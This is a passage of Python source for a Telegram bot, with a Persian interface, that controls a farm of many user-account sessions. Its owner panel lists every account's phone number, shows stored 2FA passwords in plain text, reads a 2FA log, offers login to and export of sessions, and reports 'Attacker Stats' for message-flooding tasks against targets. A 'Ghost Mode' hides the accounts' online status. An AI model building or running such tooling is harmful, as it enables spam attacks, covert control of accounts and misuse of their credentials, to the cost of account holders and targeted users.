                          _bdata = getattr(_btn, "data", None) or b""
                          if isinstance(_bdata, str):
                              _bdata = _bdata.encode()
                          if _bdata.startswith(b"tr_confirm_"):
                              await _btn.click()
                              clicked = True
                              break
                      if clicked:
                          break
                  # fallback: click first button (index 0)
                  if not clicked:
                      await confirm_msg.click(0)
                      clicked = True
              except Exception as _ce:
                  results.append(f"⚠️ {sess}: کلیک تایید خطا داد — {_ce}")
                  await asyncio.sleep(2)
                  continue
              results.append(f"✅ {sess}: انتقال {points} میو → {recip}")
          except FloodWaitError as _fw:
              results.append(f"🚫 {sess}: FloodWait {_fw.seconds}s")
          except Exception as _e:
              results.append(f"❌ {sess}: {_e}")
          if idx < len(online) - 1:
              await asyncio.sleep(2)

      summary = "\n".join(results) or "—"
      await bot.send_message(report_chat,
          f"🪙 نتیجه انتقال میویی — ریموت {gname}:\n\n{summary}",
          buttons=[[Button.inline("🪙 پنل", f"ogmiotx_panel_{gname}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"ogmiotx_([^_]+)_(.+)")))
    async def ogmiotx_dispatch_cb(event):
      action = event.pattern_match.group(1).decode()
      gname  = event.pattern_match.group(2).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)

      if action == "panel":
          await sp_edit(event, _og_miotx_text(gname), buttons=_og_miotx_buttons(gname))
          await event.answer()
          return

      if action == "run":
          s = _og_miotx_state(gname)
          if not s.get("target"):
              return await event.answer("⚠️ اول گروه مقصد رو تنظیم کن", alert=True)
          if not s.get("recipient_id"):
              return await event.answer("⚠️ اول آیدی گیرنده رو تنظیم کن", alert=True)
          await event.answer("🪙 انتقال شروع شد...")
          asyncio.create_task(_og_miotx_run(gname, event.chat_id))
          return

      if action == "settgt":
          pending_group_selection[event.sender_id] = {"og_step": "miotx_target", "og_gname": gname}
          await sp_edit(event, "🎯 آیدی یا @username یا لینک گروه مقصد رو بنویس:",
                        buttons=[[Button.inline("❌ Cancel", f"ogmiotx_panel_{gname}".encode())]])
          await event.answer()
          return

      if action == "setrecip":
          pending_group_selection[event.sender_id] = {"og_step": "miotx_recipient", "og_gname": gname}
          cur = _og_miotx_state(gname).get("recipient_id", "")
          await sp_edit(event, f"💰 آیدی عددی گیرنده میو رو بنویس:\n(فعلی: {cur or '—'})",
                        buttons=[[Button.inline("❌ Cancel", f"ogmiotx_panel_{gname}".encode())]])
          await event.answer()
          return

      await sp_edit(event, _og_miotx_text(gname), buttons=_og_miotx_buttons(gname))
      await event.answer()

    # ═══════════════════════════════════════════════════════════
    # ── callback: set group bot token prompt ──────────────────
    @bot.on(events.CallbackQuery(pattern=b"setgbot_(.+)"))
    async def cb_setgbot(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[OWNER_ID] = {"waiting_group_token": True, "group_name": gname}
      await sp_edit(event,
          f" توکن ربات از BotFather رو برای ریموت «{gname}» بفرست:\n"
          f"(مثال: 123456:ABC-xxx)\n\n"
          f" مطمئن شو ربات رو قبلاً از @BotFather گرفتی.",
          buttons=[[Button.inline("❌ Cancel", f"grp_{gname}".encode())]])
      await event.answer()

    # ── callback: start group bot ─────────────────────────────
    @bot.on(events.CallbackQuery(pattern=b"startgbot_(.+)"))
    async def cb_startgbot(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await event.answer(" در حال راه‌اندازی...")
      await start_group_bot(gname)
      status = "🟢 فعال" if gname in managed_bots else "❌ خطا در راه‌اندازی"
      await sp_edit(event, f"ربات ریموت «{gname}»: {status}",
                     buttons=[[Button.inline("🔙 Back", f"grp_{gname}".encode())]])

    # ── callback: stop group bot ──────────────────────────────
    @bot.on(events.CallbackQuery(pattern=b"stopgbot_(.+)"))
    async def cb_stopgbot(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await stop_group_bot(gname)
      await event.answer(f" ربات {gname} متوقف شد")
      await sp_edit(event, f" ربات ریموت «{gname}» متوقف شد.",
                     buttons=[[Button.inline("🔙 Back", f"grp_{gname}".encode())]])

    # ── callback: new group prompt ────────────────────────────
    @bot.on(events.CallbackQuery(data=b"menu_newgroup"))
    async def cb_newgroup(event):
      if not owner_guard(event):
          return await event.answer()
      await sp_edit(event, "🖥 ریموت — نام ریموت جدید رو بنویس:\n(مثال: group1)", buttons=[[Button.inline("❌ Cancel", b"menu_groups")]])
      pending_group_selection[OWNER_ID] = {"waiting_newgroup": True}
      await event.answer()

    # ── callback: add account prompt ─────────────────────────
    @bot.on(events.CallbackQuery(data=b"menu_add"))
    async def cb_add(event):
      if not owner_guard(event):
          return await event.answer()
      await sp_edit(event,
          " شماره تلفن اکانت رو بنویس:\n(مثال: +989xxxxxxxxx)",
          buttons=[[Button.inline("❌ Cancel", b"menu_refresh")]]
      )
      pending_group_selection[OWNER_ID] = {"waiting_phone": True}
      await event.answer()

    # ── callback: status ──────────────────────────────────────
    @bot.on(events.CallbackQuery(data=b"menu_status"))
    async def cb_status(event):
      if not owner_guard(event):
          return await event.answer()
      total = len(sessions_db)
      online = len(managed)
      text = (
          f" Status سیستم\n"
          f"━━━━━━━━━━━━━━\n"
          f" کل اکانت‌ها: {total}\n"
          f" آنلاین: {online}\n"
              f" Groups: {len(groups_db)}"
      )
      await sp_edit(event, text, buttons=[[Button.inline("🔙 Back", b"menu_refresh")]])
      await event.answer()

    # ── Owner Access: special owner-only panel ────────────────
    def _owner_panel_buttons():
      ghost_label = "👻 Ghost Mode: روشن 🟢" if GHOST_MODE else "👻 Ghost Mode: خاموش 🔴"
      bl_count = len(bot_blacklist)
      return [
          [Button.inline("📌 All Account Numbers", b"owner_phones")],
          [Button.inline("👤 Login to Account", b"owner_enter_list")],
          [Button.inline("👤 Account 2FA Keys", b"owner_2fa_list")],
          [Button.inline("🔑 2FA Log File", b"owner_2fa_log")],
          [Button.inline("⚔️ Attacker Stats", b"owner_atk_stats")],
          [Button.inline(f"🤖 Bot Blacklist ({bl_count})", b"owner_blacklist")],
          [Button.inline("🔄 Update Source (ZIP)", b"owner_update_src")],
          [Button.inline("🗂 Import Sessions (ZIP)", b"owner_import_sessions")],
          [Button.inline("📦 Export Sessions (ZIP)", b"owner_export_sessions")],
          [Button.inline("🗂 پاکسازی فایل‌های اضافه", b"owner_deepclean_preview")],
          [Button.inline(ghost_label, b"owner_ghost_toggle")],
          [Button.inline("🧹 Server Cleanup", b"owner_cleanup_preview")],
          [Button.inline("📌 افزودن همه اکانت‌ها به گروه", b"owner_add_all_to_group")],
          [Button.inline("➕ افزودن چندتایی سشن به ریموت", b"owner_multiadd_pick_remote")],
          [Button.inline("🔙 Back", b"menu_refresh")],
      ]

    def _collect_cleanup_targets() -> list:
      """فایل‌هایی که بی‌استفاده‌اند و قابل حذف هستن — هیچ‌وقت session یا data مهم رو لمس نمی‌کنه."""
      import glob
      targets = []

      # 1. بکاپ‌های قدیمی سورس
      for f in glob.glob("*.bak") + glob.glob("*.bak.*"):
          if os.path.isfile(f):
              targets.append(f)

      # 2. فایل‌های ZIP محلی (بکاپ خودکار که قبلاً به پیوی فرستاده شده)
      for f in glob.glob("backup_*.zip") + glob.glob("eliot_bot_*.zip") + glob.glob("eliot_bot_updated.zip"):
          if os.path.isfile(f):
              targets.append(f)

      # 3. session های موقت (فقط پوشه tmp — نه session های اصلی)
      tmp_dir = os.path.join(SESSIONS_DIR, "tmp")
      if os.path.isdir(tmp_dir):
          for fname in os.listdir(tmp_dir):
              if (fname.startswith("_burn_") or fname.startswith("_takeover_")):
                    targets.append(os.path.join(tmp_dir, fname))
          for f in glob.glob(os.path.join(tmp_dir, "*.session-journal")):
              targets.append(f)

      # 4. __pycache__
      if os.path.isdir("__pycache__"):
          targets.append("__pycache__/")

      return targets

    @bot.on(events.CallbackQuery(data=b"owner_access"))
    async def cb_owner_access(event):
      if not owner_guard(event):
          return await event.answer()
      txt = (
          f"{pe('🔑')} Owner Access\n"
          "━━━━━━━━━━━━━━\n"
          "فقط برای اونر اصلی سیستم"
      )
      await sp_edit(event, txt, buttons=_owner_panel_buttons())
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_burn_toggle"))
    async def cb_owner_burn_toggle(event):
      if not owner_guard(event):
          return await event.answer()
      global OTP_BURN_MODE
      OTP_BURN_MODE = not OTP_BURN_MODE
      asyncio.create_task(refresh_protected_clients())
      status = "🟢 روشن" if OTP_BURN_MODE else "🔴 خاموش"
      detail = (
          " OTP Code Burn فعال — هر کدی که بیاد فوری مصرف می‌شه تا اتکر نتونه ازش استفاده کنه."
          if OTP_BURN_MODE else
          " OTP Code Burn غیرفعال شد."
      )
      await event.answer(f" OTP Code Burn: {status}", alert=True)
      await sp_edit(event,
          f"{pe('🔑')} Owner Access\n━━━━━━━━━━━━━━\n{detail}",
          buttons=_owner_panel_buttons())

    @bot.on(events.CallbackQuery(data=b"owner_ghost_toggle"))
    async def cb_owner_ghost_toggle(event):
      if not owner_guard(event):
          return await event.answer()
      global GHOST_MODE
      GHOST_MODE = not GHOST_MODE
      save_ghost_mode()
      # بلافاصله روی همه اکانت‌ها اعمال کن — بدون منتظر موندن برای loop ۶۰ثانیه‌ای
      if GHOST_MODE:
          asyncio.create_task(_ghost_apply_all())
      status = "🟢 روشن" if GHOST_MODE else "🔴 خاموش"
      detail = (
          "👻 Ghost Mode فعال — اکانت‌ها آنلاین نشون داده نمیشن ولی دستورات رو اجرا می‌کنن."
          if GHOST_MODE else
          "👻 Ghost Mode خاموش شد — آنلاین‌ستاتوس معمولی."
      )
      await event.answer(f"Ghost Mode: {status}", alert=True)
      await sp_edit(event,
          f"{pe('🔑')} Owner Access\n━━━━━━━━━━━━━━\n{detail}",
          buttons=_owner_panel_buttons())

    @bot.on(events.CallbackQuery(data=b"owner_guard_toggle"))
    async def cb_owner_guard_toggle(event):
      if not owner_guard(event):
          return await event.answer()
      global SESSION_GUARD_ENABLED, _session_guard_task
      SESSION_GUARD_ENABLED = not SESSION_GUARD_ENABLED

      if SESSION_GUARD_ENABLED:
          if _session_guard_task and not _session_guard_task.done():
              _session_guard_task.cancel()
          _session_guard_task = asyncio.create_task(global_session_guard())
          asyncio.create_task(refresh_protected_clients())
          await event.answer(" Session Guard فعال شد", alert=True)
      else:
          if _session_guard_task and not _session_guard_task.done():
              _session_guard_task.cancel()
              _session_guard_task = None
          asyncio.create_task(refresh_protected_clients())
          await event.answer(" Session Guard خاموش شد", alert=True)
          try:
              await bot_client.send_message(OWNER_ID, " Session Guard غیرفعال شد.")
          except Exception:
              pass

      detail = (
          " Session Guard روشنه — هر ۵ ثانیه session های غیرمجاز از همه اکانت‌ها پاک می‌شن."
          if SESSION_GUARD_ENABLED else
          " Session Guard خاموش شد."
      )
      await sp_edit(event,
          f"{pe('🔑')} Owner Access\n━━━━━━━━━━━━━━\n{detail}",
          buttons=_owner_panel_buttons())

    @bot.on(events.CallbackQuery(data=b"owner_cleanup_preview"))
    async def cb_owner_cleanup_preview(event):
      if not owner_guard(event):
          return await event.answer()
      import shutil
      targets = _collect_cleanup_targets()
      if not targets:
          await sp_edit(event,
              " Server Cleanup\n━━━━━━━━━━━━━━\n سرور تمیزه — چیزی برای حذف نیست.",
              buttons=[[Button.inline("🔙 Back", b"owner_access")]])
          return await event.answer()
      # calculate total size
      total_bytes = 0
      for t in targets:
          try:
              if t.endswith("/"):
                    for root, dirs, files in os.walk(t.rstrip("/")):
                        for f in files:
                            total_bytes += os.path.getsize(os.path.join(root, f))
              else:
                    total_bytes += os.path.getsize(t)
          except Exception:
              pass
      size_kb = total_bytes / 1024
      lines = "\n".join(f"• {t}" for t in targets)
      txt = (
          f" Server Cleanup\n"
          f"━━━━━━━━━━━━━━\n"
          f"فایل‌های زیر حذف می‌شن:\n\n"
          f"{lines}\n\n"
          f" حجم کل: {size_kb:.1f} KB\n"
          f" session های اصلی و دیتابیس دست نمی‌خوره."
      )
      await sp_edit(event, txt, buttons=[
          [Button.inline("🗑 بزن بریم پاک کن", b"owner_cleanup_confirm")],
          [Button.inline("🔘 نه، برگرد", b"owner_access")],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_cleanup_confirm"))
    async def cb_owner_cleanup_confirm(event):
      if not owner_guard(event):
          return await event.answer()
      import shutil
      targets = _collect_cleanup_targets()
      cleaned = []
      failed = []
      for t in targets:
          try:
              if t.endswith("/"):
                    shutil.rmtree(t.rstrip("/"))
              else:
                    os.remove(t)
              cleaned.append(t)
          except Exception as e:
              failed.append(f"{t}: {str(e)[:40]}")
      result_lines = "\n".join(f" {c}" for c in cleaned)
      fail_lines = ("\n" + "\n".join(f"❌ {f}" for f in failed)) if failed else ""
      txt = (
          f" Cleanup انجام شد\n"
          f"━━━━━━━━━━━━━━\n"
          f"{result_lines or '—'}"
          f"{fail_lines}\n\n"
          f" {len(cleaned)} فایل پاک شد"
          + (f" | 🔴 {len(failed)} خطا" if failed else "")
      )
      await sp_edit(event, txt, buttons=[[Button.inline("🔙 Back", b"owner_access")]])
      await event.answer(" Cleanup انجام شد", alert=True)

    # ── Deep Cleanup (whitelist-based) ─────────────────────────────────────────
    def _deepclean_scan() -> list:
      """
      تمام فایل‌هایی که در whitelist نیستن رو برمی‌گردونه.
      هیچ‌وقت sessions، data، سورس اصلی، و کانفیگ Replit لمس نمی‌شن.
      """
      import glob as _g

      # ── دایرکتوری‌هایی که کاملاً محافظت می‌شن (recursive) ──
      PROTECTED_DIRS = {
          os.path.abspath(SESSIONS_DIR),   # sessions/
          os.path.abspath(DATA_DIR),        # data/
          os.path.abspath(".cache"),
          os.path.abspath(".local"),
          os.path.abspath(".agents"),
          os.path.abspath(".git"),
          os.path.abspath("__pycache__"),   # حذف نمی‌شه اینجا، cleanup ساده داره
      }

      # ── فایل‌های root که محافظت می‌شن ──
      _script = os.path.abspath(__file__)
      PROTECTED_FILES = {
          _script,
          os.path.abspath("requirements.txt"),
          os.path.abspath("replit.nix"),
          os.path.abspath(".replit"),
          os.path.abspath("zipFile.zip"),
      }

      candidates = []
      root = os.path.abspath(".")

      for entry in os.listdir(root):
          abs_entry = os.path.abspath(entry)
          # دایرکتوری‌های محافظت‌شده
          if abs_entry in PROTECTED_DIRS:
              continue
          # فایل‌های محافظت‌شده
          if abs_entry in PROTECTED_FILES:
              continue
          # فایل‌های مخفی سیستمی
          if entry.startswith(".") and os.path.isdir(abs_entry):
              continue
          candidates.append(abs_entry)

      # مرتب‌سازی: دایرکتوری‌ها آخر
      candidates.sort(key=lambda p: (os.path.isdir(p), p))
      return candidates

    @bot.on(events.CallbackQuery(data=b"owner_deepclean_preview"))
    async def cb_owner_deepclean_preview(event):
      if not owner_guard(event):
          return await event.answer()
      import shutil
      targets = _deepclean_scan()
      if not targets:
          await sp_edit(event,
              "🗂 پاکسازی فایل‌های اضافه\n━━━━━━━━━━━━━━\n✅ سرور تمیزه — فایل اضافه‌ای پیدا نشد.",
              buttons=[[Button.inline("🔙 Back", b"owner_access")]])
          return await event.answer()
      total_bytes = 0
      for t in targets:
          try:
              if os.path.isdir(t):
                  for r, d, files in os.walk(t):
                      for f in files:
                          total_bytes += os.path.getsize(os.path.join(r, f))
              else:
                  total_bytes += os.path.getsize(t)
          except Exception:
              pass
      size_mb = total_bytes / (1024 * 1024)
      lines = "\n".join(
          f"• {'📁' if os.path.isdir(t) else '📄'} {os.path.relpath(t)}"
          for t in targets
      )
      if len(lines) > 2800:
          lines = lines[:2800] + "\n..."
      txt = (
          f"🗂 پاکسازی فایل‌های اضافه\n"
          f"━━━━━━━━━━━━━━\n"
          f"فایل/پوشه‌های زیر حذف می‌شن:\n\n"
          f"{lines}\n\n"
          f"📦 حجم کل: {size_mb:.2f} MB\n\n"
          f"✅ محافظت‌شده‌ها:\n"
          f"• sessions/ — data/ — eliot_bot.py\n"
          f"• requirements.txt — replit.nix — .replit\n"
          f"• zipFile.zip — .cache/ — .local/ — .agents/"
      )
      await sp_edit(event, txt, buttons=[
          [Button.inline("🗑 تأیید و پاکسازی", b"owner_deepclean_confirm")],
          [Button.inline("🔙 انصراف", b"owner_access")],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_deepclean_confirm"))
    async def cb_owner_deepclean_confirm(event):
      if not owner_guard(event):
          return await event.answer()
      import shutil
      targets = _deepclean_scan()
      cleaned, failed = [], []
      freed = 0
      for t in targets:
          try:
              if os.path.isdir(t):
                  sz = sum(
                      os.path.getsize(os.path.join(r, f))
                      for r, d, files in os.walk(t)
                      for f in files
                  )
                  shutil.rmtree(t)
              else:
                  sz = os.path.getsize(t)
                  os.remove(t)
              freed += sz
              cleaned.append(f"• {os.path.relpath(t)}")
          except Exception as e:
              failed.append(f"❌ {os.path.relpath(t)}: {str(e)[:40]}")
      result = "\n".join(cleaned) or "—"
      fail_txt = ("\n\n" + "\n".join(failed)) if failed else ""
      freed_mb = freed / (1024 * 1024)
      txt = (
          f"✅ پاکسازی انجام شد\n"
          f"━━━━━━━━━━━━━━\n"
          f"{result}"
          f"{fail_txt}\n\n"
          f"🗑 {len(cleaned)} آیتم حذف شد"
          + (f" | ❌ {len(failed)} خطا" if failed else "")
          + f"\n💾 فضای آزادشده: {freed_mb:.2f} MB"
      )
      await sp_edit(event, txt, buttons=[[Button.inline("🔙 Back", b"owner_access")]])
      await event.answer("✅ پاکسازی انجام شد", alert=True)

    # ── callback: add ALL accounts to a chosen group (owner-only) ─────────────
    @bot.on(events.CallbackQuery(data=b"owner_add_all_to_group"))
    async def cb_owner_add_all_to_group(event):
      if not owner_guard(event):
          return await event.answer()
      if not groups_db:
          await sp_edit(event, " هیچ ریموتی ساخته نشده. ابتدا یک ریموت بساز.",
                          buttons=[[Button.inline("🔙 Back", b"owner_access")]])
          return await event.answer()
      if not sessions_db:
          await sp_edit(event, " هیچ اکانتی ثبت نشده.",
                          buttons=[[Button.inline("🔙 Back", b"owner_access")]])
          return await event.answer()
      rows = []
      for gname, info in groups_db.items():
          current = len(info.get("sessions", []))
          max_acc = info.get("max_accounts")
          cap_str = f"/{max_acc}" if max_acc else "/∞"
          rows.append([Button.inline(f"👤 {gname}  ({current}{cap_str} اکانت)",
              f"owner_add_all_confirm_{gname}".encode()
          )])
      rows.append([Button.inline("🔙 Back", b"owner_access")])
      total = len(sessions_db)
      await sp_edit(event,
          f" افزودن همه اکانت‌ها به ریموت\n"
          f"━━━━━━━━━━━━━━\n"
          f" تعداد کل اکانت‌ها: {total} تا\n\n"
          f"ریموت مقصد رو انتخاب کن:",
          buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_multiadd_pick_remote"))
    async def cb_owner_multiadd_pick_remote(event):
      if not owner_guard(event):
          return await event.answer()
      if not groups_db:
          await sp_edit(event, " هیچ ریموتی ساخته نشده.",
                          buttons=[[Button.inline("🔙 Back", b"owner_access")]])
          return await event.answer()
      rows = []
      for gname, info in groups_db.items():
          current = len(info.get("sessions", []))
          max_acc = info.get("max_accounts")
          cap_str = f"/{max_acc}" if max_acc else "/∞"
          rows.append([Button.inline(f"📁 {gname}  ({current}{cap_str} اکانت)",
              f"og_addmulti_{gname}".encode())])
      rows.append([Button.inline("🔙 Back", b"owner_access")])
      await sp_edit(event,
          f"➕ افزودن چندتایی سشن به ریموت\n"
          f"━━━━━━━━━━━━━━\n"
          f"ریموت مقصد رو انتخاب کن:",
          buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"^owner_add_all_confirm_(.+)$")))
    async def cb_owner_add_all_confirm(event):
      if not owner_guard(event):
          return await event.answer()
      gname = event.pattern_match.group(1).decode()
      if gname not in groups_db:
          await event.answer(" ریموت پیدا نشد", alert=True)
          return
      max_acc = groups_db[gname].get("max_accounts")
      # normalize: max_acc می‌تونه int، str یا None باشه
      try:
          max_acc_int = int(max_acc) if max_acc is not None else None
      except (ValueError, TypeError):
          max_acc_int = None
      existing = set(groups_db[gname].get("sessions", []))
      added = []
      skipped_dup = []
      skipped_full = []
      skipped_other_remote = []
      for sess in list(sessions_db.keys()):
          if sess in existing:
              skipped_dup.append(sess)
              continue
          if max_acc_int is not None and len(existing) >= max_acc_int:
              skipped_full.append(sess)
              continue
          _other = get_group_of_session(sess)
          if _other and _other != gname:
              skipped_other_remote.append(sess)
              continue
          _add_err = assign_session_to_group(sess, gname)
          if _add_err:
              skipped_full.append(sess)
              continue
          existing.add(sess)
          added.append(sess)
      save_groups()
      cap_str = str(max_acc_int) if max_acc_int is not None else "∞"
      lines = [
          f" افزودن همه اکانت‌ها به ریموت «{gname}»",
          "━━━━━━━━━━━━━━",
          f" اضافه شدن: {len(added)} اکانت",
      ]
      if skipped_dup:
          lines.append(f" قبلاً در ریموت بودن: {len(skipped_dup)} اکانت")
      if skipped_full:
          lines.append(f" به سقف ریموت ({cap_str}) رسید — اضافه‌نشده: {len(skipped_full)} اکانت")
      if skipped_other_remote:
          lines.append(f" در ریموت دیگر هستند — رد شدن: {len(skipped_other_remote)} اکانت")
      # برای جلوگیری از overflow پیام تلگرام: اگر بیش از ۳۰ اکانت اضافه شد فقط خلاصه نشون بده
      if added and len(added) <= 30:
          lines.append("\nاکانت‌های اضافه‌شده:")
          for s in added:
              lines.append(f"  • {s}")
      elif added:
          lines.append(f"\n(لیست {len(added)} اکانت اضافه‌شده برای جلوگیری از طولانی‌شدن پیام نمایش داده نمی‌شود)")
      await sp_edit(event, "\n".join(lines),
                      buttons=[[Button.inline("🔙 Back", b"owner_access")]])
      await event.answer()
    # ── end: add ALL accounts to group ────────────────────────────────────────
    @bot.on(events.CallbackQuery(data=b"owner_2fa_list"))
    async def cb_owner_2fa_list(event):
      if not owner_guard(event):
          return await event.answer()
      if not sessions_db:
          await sp_edit(event, "هیچ اکانتی ثبت نشده.", buttons=[[Button.inline("🔙 Back", b"owner_access")]])
          return await event.answer()
      lines = []
      for sess, info in sessions_db.items():
          phone = info.get("phone", "?")
          twofa = info.get("twofa", "")
          status = "🟢" if sess in managed else "🔴"
          if twofa:
              lines.append(f"{status} {sess}\n {phone}\n ||{twofa}||")
          else:
              lines.append(f"{status} {sess}\n {phone}\n بدون 2FA")
      txt = " Account 2FA Keys\n━━━━━━━━━━━━━━\n\n" + "\n\n".join(lines)
      await sp_edit(event, txt, buttons=[[Button.inline("🔙 Back", b"owner_access")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_2fa_log"))
    async def cb_owner_2fa_log(event):
      if not owner_guard(event):
          return await event.answer()
      if not os.path.exists(TWOFA_LOG):
          await sp_edit(event, " هنوز هیچ 2FA ای لاگ نشده.", buttons=[[Button.inline("🔙 Back", b"owner_access")]])
          return await event.answer()
      try:
          with open(TWOFA_LOG, "r", encoding="utf-8") as f:
              content = f.read().strip()
          if not content:
              await sp_edit(event, " فایل لاگ خالیه.", buttons=[[Button.inline("🔙 Back", b"owner_access")]])
          elif len(content) <= 3800:
              await sp_edit(event, f" لاگ 2FA:\n\n<code>{content}</code>",
                              buttons=[[Button.inline("🔙 Back", b"owner_access")]],
                              parse_mode="html")
          else:
              # فایل بزرگه — بفرست به عنوان فایل
              await event.answer()
              await bot.send_file(event.chat_id, TWOFA_LOG, caption=" لاگ کامل 2FA")
              return
      except Exception as e:
          await sp_edit(event, f" خطا: {e}", buttons=[[Button.inline("🔙 Back", b"owner_access")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_atk_stats"))
    async def cb_owner_atk_stats(event):
      if not owner_guard(event):
          return await event.answer()
      if not atk_stats:
          await sp_edit(event, " هیچ اتکری تا حالا اجرا نشده.", buttons=[[Button.inline("🔙 Back", b"owner_access")]])
          return await event.answer()
      now = datetime.utcnow()
      lines = []
      for key, st in atk_stats.items():
          started = st.get("started_at")
          if started:
              delta = now - started
              h, rem = divmod(int(delta.total_seconds()), 3600)
              m, s   = divmod(rem, 60)
              uptime = f"{h:02d}:{m:02d}:{s:02d}"
          else:
              uptime = "—"
          label = key if not key.startswith("og_") else f"OG:{key[3:]}"
          is_active = key in atk_tasks and not atk_tasks[key].done()
          status = "🟢" if is_active else "🔴"
          lines.append(
              f"{status} {label}\n"
              f" مقصد: {st.get('target','—')}\n"
              f" ارسال‌شده: {st.get('sent',0)}\n"
              f" خطا: {st.get('errors',0)}\n"
              f" آپتایم: {uptime}"
          )
      txt = " Attacker Stats\n━━━━━━━━━━━━━━\n\n" + "\n\n".join(lines)
      await sp_edit(event, txt, buttons=[[Button.inline("🔙 Back", b"owner_access")]])
      await event.answer()

    # ── Blacklist management ───────────────────────────────────
    def _bl_panel_text():
      if not bot_blacklist:
          return " بلاک‌لیست ربات\n━━━━━━━━━━━━━━\nهیچ کاربری بلاک نشده."
      lines = [f" Bot Blacklist ({len(bot_blacklist)} نفر)\n━━━━━━━━━━━━━━"]
      for uid in sorted(bot_blacklist):
          lines.append(f"• <code>{uid}</code>")
      return "\n".join(lines)

    @bot.on(events.CallbackQuery(data=b"owner_blacklist"))
    async def cb_owner_blacklist(event):
      if not owner_guard(event):
          return await event.answer()
      buttons = [
          [Button.inline("🔴 Block User", b"bl_add")],
          [Button.inline("👤 Unblock User", b"bl_remove")],
          [Button.inline("📌 Clear All", b"bl_clear")],
          [Button.inline("🔙 Back", b"owner_access")],
      ]
      await sp_edit(event, _bl_panel_text(), buttons=buttons, parse_mode="html")
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"bl_add"))
    async def cb_bl_add(event):
      if not owner_guard(event):
          return await event.answer()
      await sp_edit(event,
          " بلاک کردن کاربر\n━━━━━━━━━━━━━━\n"
          "آیدی عددی کاربر رو بفرست (مثلاً: 123456789)\n"
          "چند تا رو با فاصله یا خط جدا بفرست:",
          buttons=[[Button.inline("❌ Cancel", b"owner_blacklist")]])
      await event.answer()
      conv_key = ("bl_add", event.chat_id)
      pending_logins[str(conv_key)] = {"step": "bl_add_uid", "chat_id": event.chat_id}

    @bot.on(events.CallbackQuery(data=b"bl_remove"))
    async def cb_bl_remove(event):
      if not owner_guard(event):
          return await event.answer()
      if not bot_blacklist:
          await event.answer("لیست خالیه!", alert=True)
          return
      rows = []
      for uid in sorted(bot_blacklist):
          rows.append([Button.inline(f"🔘 {uid}", f"bl_rm_{uid}".encode())])
      rows.append([Button.inline("🔙 Back", b"owner_blacklist")])
      await sp_edit(event,
          " آنبلاک کردن\n━━━━━━━━━━━━━━\nروی آیدی بزن تا آنبلاک بشه:",
          buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"bl_rm_(\d+)")))
    async def cb_bl_rm_uid(event):
      if not owner_guard(event):
          return await event.answer()
      uid = int(event.pattern_match.group(1))
      bot_blacklist.discard(uid)
      save_blacklist()
      await event.answer(f" {uid} آنبلاک شد")
      # rebuild remove list
      if not bot_blacklist:
          buttons = [
              [Button.inline("🔴 Block User", b"bl_add")],
              [Button.inline("👤 Unblock User", b"bl_remove")],
              [Button.inline("📌 Clear All", b"bl_clear")],
              [Button.inline("🔙 Back", b"owner_access")],
          ]
          await sp_edit(event, _bl_panel_text(), buttons=buttons, parse_mode="html")
      else:
          rows = []
          for u in sorted(bot_blacklist):
              rows.append([Button.inline(f"🔘 {u}", f"bl_rm_{u}".encode())])
          rows.append([Button.inline("🔙 Back", b"owner_blacklist")])
          await sp_edit(event,
              " آنبلاک کردن\n━━━━━━━━━━━━━━\nروی آیدی بزن تا آنبلاک بشه:",
              buttons=rows)

    @bot.on(events.CallbackQuery(data=b"bl_clear"))
    async def cb_bl_clear(event):
      if not owner_guard(event):
          return await event.answer()
      bot_blacklist.clear()
      save_blacklist()
      await event.answer(" همه آنبلاک شدن")
      buttons = [
          [Button.inline("🔴 Block User", b"bl_add")],
          [Button.inline("👤 Unblock User", b"bl_remove")],
          [Button.inline("📌 Clear All", b"bl_clear")],
          [Button.inline("🔙 Back", b"owner_access")],
      ]
      await sp_edit(event, _bl_panel_text(), buttons=buttons, parse_mode="html")

    @bot.on(events.NewMessage())
    async def _bl_add_conv(event):
      """Catch free-text UID input for blacklist add."""
      if event.sender_id != OWNER_ID:
          return
      key = str(("bl_add", event.chat_id))
      state_entry = pending_logins.get(key)
      if not state_entry or state_entry.get("step") != "bl_add_uid":
          return
      del pending_logins[key]
      raw = event.raw_text.strip().replace(",", " ").replace("\n", " ")
      added, bad = [], []
      for token in raw.split():
          token = token.strip().lstrip("@")
          try:
              uid = int(token)
              if uid == OWNER_ID:
                    bad.append(f"{token} (اونر رو نمیشه بلاک کرد)")
              else:
                    bot_blacklist.add(uid)
                    added.append(str(uid))
          except ValueError:
              bad.append(token)
      if added:
          save_blacklist()
      parts = []
      if added:
          parts.append(f" بلاک شد: {', '.join(added)}")
      if bad:
          parts.append(f" نامعتبر: {', '.join(bad)}")
      await bot.send_message(event.chat_id, "\n".join(parts) or "هیچ تغییری نشد",
                               buttons=[[Button.inline("🔙 Back", b"owner_blacklist")]])

    @bot.on(events.CallbackQuery(data=b"owner_phones"))
    async def cb_owner_phones(event):
      if not owner_guard(event):
          return await event.answer()
      if not sessions_db:
          await sp_edit(event, "هیچ اکانتی ثبت نشده.", buttons=[[Button.inline("🔙 Back", b"owner_access")]])
          return await event.answer()
      lines = []
      for sess, info in sessions_db.items():
          phone = info.get("phone", "?")
          has_2fa = "🔐" if info.get("twofa") else "🔓"
          grp = get_group_of_session(sess) or "—"
          status = "🟢" if sess in managed else "🔴"
          lines.append(f"{status} {has_2fa} {sess}: {phone} | ریموت: {grp}")
      txt = " شماره‌های اکانت‌ها\n━━━━━━━━━━━━━━\n" + "\n".join(lines)
